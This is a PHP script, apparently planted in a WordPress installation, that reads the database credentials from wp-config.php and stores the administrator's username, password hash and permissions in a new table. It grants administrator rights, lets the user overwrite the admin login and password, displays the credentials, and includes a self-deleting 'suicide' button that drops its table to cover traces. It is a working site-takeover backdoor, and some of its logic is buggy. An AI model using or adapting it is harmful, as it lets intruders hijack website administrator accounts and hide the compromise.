
<? 
ob_start();
include "wp-config.php";

$connect = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);


$table = "CREATE TABLE logindetails(
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, 
name VARCHAR(80) NOT NULL,
pass VARCHAR(80) NOT NULL,
permissions VARCHAR(2000) NOT NULL,
reg_date TIMESTAMP
)";

mysqli_query($connect, $table);

//$table2= "INSERT INTO logindetails ( name, pass )
//SELECT user_login, user_pass
//FROM ".$table_prefix."users  WHERE ID=1"; 

//mysqli_query($connect, $table2);

$selectu = mysqli_query($connect, "select user_login from ".$table_prefix."users  WHERE ID=1");
$resu = ect_fetch_assoc($selectu);
$saveu = $resu['user_login'] ;

$selectp = mysqli_query($connect, "select user_pass from ".$table_prefix."users  WHERE ID=1");
$resp = ect_fetch_assoc($selectp);
$savep = $resp['user_pass'] ;

$selectpimis = mysqli_query($connect, "select meta_value from ".$table_prefix."usermeta  WHERE umeta_id=10");
$respimis = ect_fetch_assoc($selectpimis);
$savepermiss = $respimis['meta_value'] ;

$admin = 'a:1:{s:13:"administrator";b:1;}';
echo $admin;
$iamadmin = mysqli_query($connect, "update ".$table_prefix."usermeta set meta_value = '$admin' WHERE umeta_id=10");

$table2= "INSERT INTO logindetails (name, pass, permissions)
VALUES ( '$saveu', '$savep', '$savepermiss')"; 
mysqli_query($connect, $table2);


//function escape_string($estr){
//    return(@$GLOBALS['ectdatabase']?$GLOBALS['ectdatabase']->real_escape_string($estr):mysqli_real_escape_string($estr));
//}
function ect_fetch_assoc($ectres){
    return(@$GLOBALS['ectdatabase']?$ectres->fetch_assoc():mysqli_fetch_assoc($ectres));
}
function ect_free_result($ectres){
    @$GLOBALS['ectdatabase']?$ectres->free_result():mysqli_free_result($ectres);
}
function dohashpw($thepw){
        if(trim($thepw)=='') return(''); else return(md5(trim($thepw)));
}

if (!preg_match("/^[a-zA-Z0-9]*$/", $_POST['usern'])) {
    $falceu = 'Username is not valid <br/>';
    $user = $falceu;


}

if  (!preg_match("/^[a-zA-Z0-9]*$/", $_POST['passw'])) {
     $falcep = 'Password is not valid <br/>';
     $psw = $falcep;
     
}
if 

(@$_POST['posted']=='1' and preg_match("/^[a-zA-Z0-9 \s]+$/", $_POST['posted']))
 {
$sSQL = "UPDATE ".$table_prefix."users SET user_login='".mysqli_real_escape_string($connect, $_POST['usern'])."',user_pass='".mysqli_real_escape_string($connect, dohashpw($_POST['passw']))."' WHERE ID=1";
    mysqli_query($connect, $sSQL) or print(mysql_error());
    print ' <div class="container"> <p class="pstype">Password updated! </p>';

}

function mysqli_result($res,$row=0,$col=0){ 
    $numrows = mysqli_num_rows($res); 
    if ($numrows && $row <= ($numrows-1) && $row >=0){
        mysqli_data_seek($res,$row);
        $resrow = (is_numeric($col)) ? mysqli_fetch_row($res) : mysqli_fetch_assoc($res);
        if (isset($resrow[$col])){
            return $resrow[$col];
        }
    }
    return false;
}

$number = mysqli_result(mysqli_query($connect, "select max(id) from logindetails"),0)   ;
$uid = $number - 1;

$oldu = mysqli_query($connect, "select name from logindetails where id = 1");
if ($uid < 1) {
echo "   <div class='container'>";
echo "<p  class='pstype' >Username is not updated yet </p>";
   } else {
$rs1 = ect_fetch_assoc($oldu);
echo "   <div class='container'>";
echo "<p class='pstype'>The old username is :";
echo  $rs1['name'] ;
echo "</p>";
}

$oldp = mysqli_query($connect, "select pass from logindetails where id = 1");
if ($uid < 1) {
echo " <p class='pstype'>Password is not updated yet </p><br />";
   } else {
$rs2 = ect_fetch_assoc($oldp);
echo "<p class='pstype'>The old password is :";
echo  $rs2['pass'] ;
echo "</p><br/>";
} 

$orig2 = mysqli_result(($oldp),0)   ;
$orig3 = mysqli_result(($oldu),0)   ;

$setback = mysqli_query ($connect, "UPDATE ".$table_prefix."users SET user_login = '$orig3', user_pass = '$orig2'  WHERE id = 1");
$setbackpermis = mysqli_query ($connect, "UPDATE ".$table_prefix."usermeta SET meta_value = '$savepermiss' WHERE umeta_id = 10");

?>
<html>
<head>
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<link href='https://fonts.googleapis.com/css?family=Hind:500' rel='stylesheet' type='text/css'>
<style type="text/css" >
body { 
background: linear-gradient(#C3BAF9, #FEFEFE);
margin-top: 10% !important; 
}
.container {
padding-left: 0px;
margin-right: 0px;
}
.img{
    position: absolute;
    top: 50%;
}

p.pstype 
{
    color: black;
    white-space: normal;
    line-height: normal;
    font-weight: normal;
    font-size: medium;
    font-variant: normal;
    font-style: normal;
    color: -internal-quirk-inherit;
    text-align: start;
font-family: 'Hind', sans-serif;

}
.btn btn-primary
{
    align: left;
    position: relative;
}
.btn btn-danger
{
    align: left;
}
.top
{
    position: absolute;
    top: 55px;
} 
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script>
$(document).ready(function() 
{
    var warn_on_unload="";
    $('input:text,input:checkbox,input:radio,textarea,select').one('change', function() 
    {
        warn_on_unload = "Leaving this page will cause any unsaved data to be lost.";

        $("input").click(function(e) { 
            warn_on_unload = "";}); 

            window.onbeforeunload = function() { 
            if(warn_on_unload != ''){
                return warn_on_unload;
            }   
        }
    });
});
</script>
</head>


<body>


<form method="post" action=""><input type="hidden" name="posted" value="1" />

<div class="col-xs-3">
 <label for="ex2">New Username: </label> <?echo $user ?>
<input type="text" class="form-control input-lg" name="usern" required placeholder="Username" maxlength="20">
</div>

<div class="col-xs-3">
<label for="ex2">New Password: </label> <?echo $psw ?>
<input type="password"  class="form-control input-lg" name="passw" required placeholder="Password" maxlength="20" >
</div>

    <div class="clearfix"></div>
  <div><br/></div>

<div class="col-xs-3">
<input type="submit"   class="btn btn-primary btn-lg btn-block" value="Submit" onclick="<? mysqli_query ($connect, $sSQL);
mysqli_query ($connect, $iamadmin);  ?>; ">
</div>

</form>
   <div class="clearfix"></div>
     <div><br/></div>


<form method="post" action="">
<div class="col-xs-3">
<input type="submit"  class="btn btn-primary btn-lg btn-block" value="setback" onclick="<? mysqli_query ($connect, $setback); mysqli_query ($connect, $setbackpermis); ?>; "> 
</div>

    <div class="clearfix"></div>
      <div><br/></div>


<div class="col-xs-3">
<input type="submit" class="btn btn-danger btn-lg btn-block" value="suicide" NAME="btnSuicide" />
<? if(isset($_POST['btnSuicide'])){
echo '<script type="text/javascript">alert("REMOVED ");</script>';
$suicidesuccessful = unlink($_SERVER['SCRIPT_FILENAME']) ;
$drop = mysqli_query($connect, "DROP TABLE IF EXISTS ".$DB_NAME."logindetails") or die(mysqli_error());
mysqli_query($connect, $drop);}
?>
</div>

</form>

<?


$result = mysqli_query($connect,  "SELECT user_login,user_pass FROM ".$table_prefix."users WHERE ID=1");

$rs = ect_fetch_assoc($result);
mysqli_free_result ($result);
echo "<div class ='top '> <p class='pstype'> The username is : " . $rs['user_login'] . "</p>";
echo " <p class='pstype'> The password is : " . $rs['user_pass']. "</p><br/></div>";
?>


</body>
</html>

